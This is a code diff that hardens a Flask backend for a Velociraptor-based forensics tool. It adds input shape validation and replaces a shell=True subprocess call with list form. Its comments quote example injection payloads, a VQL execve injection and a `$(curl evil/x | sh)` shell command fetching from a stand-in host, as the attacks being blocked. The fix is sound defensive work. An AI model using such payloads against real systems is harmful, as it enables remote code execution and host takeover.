@@ -30,7 +30,7 @@ def run_timesketch_collection():
     sys.stdout.flush()
 
     try:
-        data = request.get_json()
+        data = request.get_json(silent=True) or {}
         client_id = data.get('client_id')
         client_name = data.get('client_name', 'Unknown')  # Get client name (hostname)
         kape_target = data.get('kape_target', '_KapeTriage')  # Default to _KapeTriage
@@ -39,8 +39,24 @@ def run_timesketch_collection():
         blueprint_id = data.get('blueprint_id')
         blueprint_name = data.get('blueprint', 'Unknown')
 
-        if not client_id:
-            return jsonify({"error": "client_id is required"}), 400
+        # SHAPE VALIDATION (Mythos finding #2). `client_id` and
+        # `kape_target` flow downstream into `collect_client(client_id=
+        # '...', artifacts='...')` VQL strings (kape_service.py:90, 246)
+        # and into a `shell=True` `docker exec ... query "SELECT
+        # cancel_flow(client_id='{cid}'...)"` cleanup callback below.
+        # Without this check, `client_id` shaped like `C.x"); execve(
+        # ...); --` injects VQL on the velociraptor server (RCE via
+        # execve), and `client_id` like `$(curl evil/x | sh)` injects
+        # on the backend container's shell (RCE via docker socket →
+        # root on host). Legitimate IDs are always `C.<hex>` and
+        # `kape_target` is always an artifact name; both shapes reject
+        # the attack payloads with no false-positives for real
+        # operator inputs.
+        from services.vql_safety import is_valid_client_id, is_valid_artifact_name
+        if not is_valid_client_id(client_id):
+            return jsonify({"error": "client_id is required and must match C.<hex>"}), 400
+        if not is_valid_artifact_name(kape_target):
+            return jsonify({"error": "kape_target must be a Velociraptor artifact name"}), 400
 
         # If a blueprint was provided, load its settings so this manual-run
         # path uses the same ceilings as the scheduled path. Without this,
@@ -116,14 +132,24 @@ def run_timesketch_collection():
         register_cancel_event(run_id)
         # Cleanup callback cancels the Velociraptor flow when Stop is
         # clicked — so the endpoint stops collecting + uploading too.
+        # `cid` is shape-validated above (^C\.[0-9a-f]+$); `fid` came
+        # from `run_kape_collection_grpc` (server-generated, not
+        # operator input). Subprocess is arg-list form + shell=False
+        # as defense-in-depth — even if a future code change drops the
+        # validator, the args never pass through a shell parser so
+        # injection via $(...)/backtick/quotes can't reach the host.
         def _cancel_velo_flow(cid=client_id, fid=flow_id):
             try:
                 import subprocess as _sp
                 _sp.run(
-                    f"docker exec intact_velociraptor /velociraptor/velociraptor "
-                    f"--api_config /velociraptor/api.config.yaml --nobanner query "
-                    f"\"SELECT cancel_flow(client_id='{cid}', flow_id='{fid}') FROM scope()\"",
-                    shell=True, capture_output=True, timeout=10
+                    [
+                        "docker", "exec", "intact_velociraptor",
+                        "/velociraptor/velociraptor",
+                        "--api_config", "/velociraptor/api.config.yaml",
+                        "--nobanner", "query",
+                        f"SELECT cancel_flow(client_id='{cid}', flow_id='{fid}') FROM scope()",
+                    ],
+                    shell=False, capture_output=True, timeout=10,
                 )
             except Exception:
                 pass
@@ -235,8 +261,26 @@ def run_bestpractice_hunts():
         artifact independently.
     """
     try:
-        data = request.get_json()
+        data = request.get_json(silent=True) or {}
         artifacts = data.get('artifacts', [])
+
+        # SHAPE VALIDATION (Mythos #4 extended): each artifact name
+        # gets interpolated into a VQL `hunt(artifacts=[...], ...)`
+        # string at lines ~210 and ~405. Velociraptor's parser today
+        # rejects malformed names — but that's the wrong layer to
+        # rely on. Validate the shape at the route entry: every legit
+        # Velociraptor artifact follows `^[A-Za-z0-9_.\-:]+$`, attack
+        # shapes (quotes, parens, semicolons) never match.
+        if not isinstance(artifacts, list):
+            return jsonify({"error": "artifacts must be a list of artifact names"}), 400
+        if len(artifacts) > 500:
+            return jsonify({"error": "artifacts list too long (>500 items)"}), 400
+        from services.vql_safety import is_valid_artifact_name
+        for i, a in enumerate(artifacts):
+            if not isinstance(a, str) or not is_valid_artifact_name(a):
+                return jsonify({
+                    "error": f"artifacts[{i}] is not a valid Velociraptor artifact name"
+                }), 400
         blueprint_name = data.get('blueprint_name', 'Custom')
         expire_minutes = data.get('expire_minutes', 120)
         timeout_seconds = data.get('timeout_seconds', 10000)
